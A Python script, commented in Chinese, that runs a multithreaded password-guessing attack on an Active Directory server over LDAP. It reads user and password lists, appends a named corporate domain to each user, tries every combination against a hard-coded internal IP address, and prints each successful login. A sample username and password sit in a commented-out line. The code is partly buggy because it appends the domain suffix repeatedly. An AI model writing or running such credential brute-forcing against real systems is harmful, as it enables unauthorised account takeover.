# -*- coding: utf-8 -*-
# import class and constants
from ldap3 import Server, Connection, ALL
import _thread
import time

# define the server
s = Server('192.168.100.192', get_info=ALL)  # define an unsecure LDAP server, requesting info on DSE and schema
count=0
#读入users.txt文件并分成两个列表为多线程做准备
with open('users.txt','r') as f:
    line = f.read().strip()
    users = line.split("\n")         # 以换行符分隔
    print(users)
for i in range(0, len(users)):
    print(users[i],len(users))
f.close()
users1=users[0:len(users)//2]
users2=users[len(users)//2:len(users)]
print(users1)
print(users2)
#读入密码文件
with open('passwords.txt','r') as f:
    line = f.read().strip()
    passwords = line.split("\n")         # 以换行符分隔
    print(passwords)
for k in range(0, len(passwords)):
    print(passwords[k])
f.close()



#定义多线程比对算法 
def testADpassword(users,passwords,threadName):
    for i in range(0,len(users)):
        for k in range(0,len(passwords)):
        # print (users[i],passwords[k])
        #testADpassword(users[i],passwords[k])
        #ps='sun.123'
        #us='lainanfei@sunekp.cn'
        # define the connection
            #global count
            users[i]=users[i] + "@sunekp.cn"    
            c = Connection(s, user=users[i], password=passwords[k])
            # perform the Bind operation
            if not c.bind():
            #print('error in bind', c.result)
                print("not bind",threadName)   
            else:
                print("you bind success!your name is:",users[i] ,threadName)
                c.unbind()
                #count=count+1
        #return count
        

# 创建两个线程
try:
    _thread.start_new_thread( testADpassword, (users1,passwords,"thread-1",) )
    _thread.start_new_thread( testADpassword, (users2,passwords,"thread-2 ",) )
except:
    print ("Error: 无法启动线程")


print(count)

